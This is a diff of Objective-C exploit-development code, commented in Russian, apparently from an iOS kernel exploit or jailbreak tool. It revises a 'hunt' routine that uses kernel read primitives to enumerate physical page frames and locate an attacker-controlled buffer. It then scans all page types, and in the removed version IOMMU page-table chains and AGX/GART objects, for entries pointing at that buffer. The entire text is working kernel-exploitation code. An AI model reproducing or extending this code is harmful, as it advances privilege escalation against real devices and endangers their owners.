@@ -5397,15 +5397,15 @@ static BOOL kpHuntPtrOK(uint64_t v)
     }
 
     // 3b. frame table enum ЧАНКАМИ (4КБ = 256 записей за read): гистограмма
-    //     типов + списки heap-страниц (0x21/0x0b) и IOMMU-таблиц (0x17).
+    //     типов + мастер-список {ppn,type} + список heap-страниц для sig-скана.
     uint64_t tableVA = [self frameTableVAWithLog:r];
     if (!tableVA) { GNOTE( @"FAIL: frame table"); gGartLive = NO; return r; }
     uint64_t pb = kconstant(physBase), ps = kconstant(physSize);
     uint32_t totalPages = (uint32_t)(ps >> 14);
     uint32_t *heapPages = malloc((size_t)totalPages * 4);
-    uint32_t *iommuPages = malloc((size_t)totalPages * 4);
-    if (!heapPages || !iommuPages) { GNOTE( @"FAIL: malloc"); gGartLive = NO; return r; }
-    uint32_t nheap = 0, niommu = 0;
+    uint64_t *allPages = malloc((size_t)totalPages * 8);
+    if (!heapPages || !allPages) { GNOTE( @"FAIL: malloc"); gGartLive = NO; return r; }
+    uint32_t nheap = 0, nall = 0;
     uint32_t typeCount[256]; memset(typeCount, 0, sizeof(typeCount));
     {
         uint8_t fch[0x1000];
@@ -5415,8 +5415,8 @@ static BOOL kpHuntPtrOK(uint64_t v)
             for (uint32_t j = 0; j < n; j++) {
                 uint8_t ft = fch[j * 16 + 2];
                 typeCount[ft]++;
+                allPages[nall++] = (uint64_t)(base + j) | ((uint64_t)ft << 32);
                 if (ft == 0x21 || ft == 0x0b) heapPages[nheap++] = base + j;
-                else if (ft == 0x17) iommuPages[niommu++] = base + j;
             }
             if (base && (base & 0xFFFF) == 0)
                 GNOTE( [NSString stringWithFormat:@"  enum: %u/%u страниц…", base, totalPages]);
@@ -5427,7 +5427,7 @@ static BOOL kpHuntPtrOK(uint64_t v)
         for (int t = 0; t < 256; t++) if (typeCount[t]) [hist appendFormat:@"0x%02x×%u ", t, typeCount[t]];
         GNOTE( [NSString stringWithFormat:@"  frame types: %@", hist]);
     }
-    GNOTE( [NSString stringWithFormat:@"  heap/userland страниц: %u · IOMMU таблиц: %u", nheap, niommu]);
+    GNOTE( [NSString stringWithFormat:@"  heap/userland страниц: %u", nheap]);
 
     // 3c. sig-скан heap-страниц → PA страниц bufB
     uint64_t sigPA[40]; int nsig = 0;
@@ -5446,67 +5446,55 @@ static BOOL kpHuntPtrOK(uint64_t v)
     }
     GNOTE( [NSString stringWithFormat:@"  sig-скан: найдено %d страниц bufB", nsig]);
 
-    // 3d/3e. PTE-слот и обратная цепь L3→L2→L1 по 0x17 таблицам.
-    //     Читаем каждую таблицу кусками по 0x100 (32 qword'а за read).
+    // 3d. needle-скан ВСЕХ типов страниц по всем 17 PA буфера.
+    //     Page-mask compare, БЕЗ valid-гейта (v6 требовал (v&1) — возможно,
+    //     зря). Приоритет типов: сначала безопасные/вероятные, 0x0b в конце.
+    //     Перед каждым типом — строка в лог: если какой-то тип фолтит при
+    //     чтении апертурой, увидим виновника в syslog.
     if (nsig) {
-        uint64_t l3pa = 0, pteSlotVA = 0, pteVal = 0;
-        uint64_t targets[3]; targets[0] = sigPA[0]; targets[1] = 0; targets[2] = 0;
-        uint8_t sch[0x100];
-        for (int stage = 0; stage < 3 && targets[stage]; stage++) {
-            uint64_t want = targets[stage] & 0xFFFFFFFFF000ULL;
-            uint64_t hitPA = 0, hitVal = 0; uint32_t hitIdx = 0;
-            for (uint32_t i = 0; i < niommu && !hitPA; i++) {
-                uint64_t ppa = pb + ((uint64_t)iommuPages[i] << 14);
-                uint64_t pva = gPrimitives.phystokv(ppa);
-                for (int off = 0; off < 0x4000; off += 0x100) {
-                    kreadbuf(pva + off, sch, 0x100);
-                    for (int q = 0; q < 32; q++) {
+        static const uint8_t prio[] = {0x17,0x21,0x0e,0x13,0x37,0x06,0x09,0x11,0x18,0x14,0x0c,0x10,0x0b};
+        int hits = 0;
+        for (int pi = 0; pi < 13 && hits < 24; pi++) {
+            uint8_t t = prio[pi];
+            if (!typeCount[t]) continue;
+            GNOTE( [NSString stringWithFormat:@"  скан типа 0x%02x (%u страниц)…", t, typeCount[t]]);
+            uint32_t scanned = 0;
+            for (uint32_t i = 0; i < nall && hits < 24; i++) {
+                if ((uint32_t)(allPages[i] >> 32) != t) continue;
+                uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
+                uint64_t va = gPrimitives.phystokv(pa);
+                uint8_t pgch[0x1000];
+                for (int seg = 0; seg < 4 && hits < 24; seg++) {
+                    kreadbuf(va + (uint64_t)seg * 0x1000, pgch, 0x1000);
+                    for (int q = 0; q < 512; q++) {
                         uint64_t v;
-                        memcpy(&v, sch + q * 8, 8);
-                        if ((v & 0xFFFFFFFFF000ULL) == want && (v & 1)) {
-                            hitPA = ppa; hitVal = v; hitIdx = (uint32_t)(off / 8) + (uint32_t)q;
+                        memcpy(&v, pgch + q * 8, 8);
+                        uint64_t vm = v & 0xFFFFFFFFF000ULL;
+                        if (!vm) continue;
+                        for (int ni = 0; ni < nsig; ni++) {
+                            if (vm != sigPA[ni]) continue;
+                            GNOTE( [NSString stringWithFormat:@"★ HIT: type=0x%02x page=%#llx slot=%d val=%#llx (needle=bufB[%d])",
+                                       t, pa, seg * 512 + q, v, ni]);
+                            for (int c = q - 4; c <= q + 4; c++) {
+                                if (c < 0 || c >= 512) continue;
+                                uint64_t cv;
+                                memcpy(&cv, pgch + c * 8, 8);
+                                GNOTE( [NSString stringWithFormat:@"    ctx[%+d] = %#llx", c - q, cv]);
+                            }
+                            hits++;
                             break;
                         }
-                    }
-                    if (hitPA) break;
-                }
-                if (i && (i & 0x3F) == 0)
-                    GNOTE( [NSString stringWithFormat:@"  PTE-скан stage%d: %u/%u таблиц…", stage, i, niommu]);
-            }
-            if (!hitPA) { GNOTE( [NSString stringWithFormat:@"  stage%d: qword %#llx… не найден ни в одной таблице (%u)", stage, want, niommu]); break; }
-            const char *sn = stage == 0 ? "L3" : (stage == 1 ? "L2" : "L1root");
-            GNOTE( [NSString stringWithFormat:@"★ %s: page PA=%#llx entry[%u]=%#llx (VA слота=%#llx)",
-                       sn, hitPA, hitIdx, hitVal, gPrimitives.phystokv(hitPA) + (uint64_t)hitIdx * 8]);
-            if (stage == 0) { l3pa = hitPA; pteVal = hitVal; pteSlotVA = gPrimitives.phystokv(hitPA) + (uint64_t)hitIdx * 8; }
-            targets[stage + 1] = hitPA;
-        }
-        if (targets[2]) {
-            // 3f. корень найден: кто ссылается на root VA?
-            uint64_t rootPA = targets[2];
-            uint64_t rootVA = gPrimitives.phystokv(rootPA);
-            GNOTE( [NSString stringWithFormat:@"  root таблицы: PA=%#llx VA=%#llx · PTE слот=%#llx val=%#llx", rootPA, rootVA, pteSlotVA, pteVal]);
-            uint64_t shared = kp_rc_kread64(agxuc + 0x120);
-            shared = kpHuntPtrOK(shared) ? kp_untag_ptr(shared) : 0;
-            struct { uint64_t obj; const char *nm; uint64_t sz; } hr[] = {
-                { agxuc, "uc", 0x400 }, { shared, "shared", 0x400 },
-                { accel, "accel", 0x400 }, { gart, "gart", 0x300 }, { mux, "mux", 0x200 },
-            };
-            int owners = 0;
-            for (int ri = 0; ri < 5; ri++) {
-                if (!hr[ri].obj) continue;
-                for (uint64_t off = 0; off < hr[ri].sz; off += 8) {
-                    uint64_t v = kp_rc_kread64(hr[ri].obj + off);
-                    if (kp_untag_ptr(v) == rootVA) {
-                        GNOTE( [NSString stringWithFormat:@"★★ ВЛАДЕЛЕЦ root: %s+%#llx", hr[ri].nm, off]);
-                        owners++;
+                        if (hits >= 24) break;
                     }
                 }
+                if (++scanned == 32768)
+                    GNOTE( [NSString stringWithFormat:@"    …тип 0x%02x: 32768 страниц…", t]);
             }
-            GNOTE( [NSString stringWithFormat:@"  владельцев root найдено: %d", owners]);
         }
+        GNOTE( [NSString stringWithFormat:@"  needle-скан: hits=%d", hits]);
     }
-    free(heapPages); free(iommuPages);
-    GNOTE( @"  hunt v6 завершён");
+    free(heapPages); free(allPages);
+    GNOTE( @"  hunt v7 завершён");
     gGartLive = NO;
     return r;
 }
